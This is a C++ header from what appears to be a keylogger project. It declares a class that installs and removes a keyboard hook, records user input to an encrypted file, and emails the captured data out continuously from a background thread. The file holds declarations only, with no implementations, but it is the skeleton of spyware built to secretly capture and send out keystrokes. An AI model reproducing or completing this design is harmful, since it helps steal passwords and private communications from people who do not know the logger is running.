#pragma once

#include "KeyboardProcessor.h"
#include "MailSender.h"
#include "UserInputEncryptedFileLogger.h"

namespace keylogger
{
using namespace std::chrono_literals;

class Keylogger
{
public:
    Keylogger(std::unique_ptr<mail::MailSender> mailSenderInit,
              std::unique_ptr<KeyboardProcessor> keyboardProcessorInit,
              std::unique_ptr<UserInputEncryptedFileLogger> userInputFileLoggerInit);
    ~Keylogger();

    [[noreturn]] void sendMailContinuously();
    void installHook();
    void uninstallHook();

private:
    std::thread mailThread;
    std::unique_ptr<mail::MailSender> mailSender;
    std::unique_ptr<KeyboardProcessor> keyboardProcessor;
    std::unique_ptr<UserInputEncryptedFileLogger> userInputFileLogger;
};
}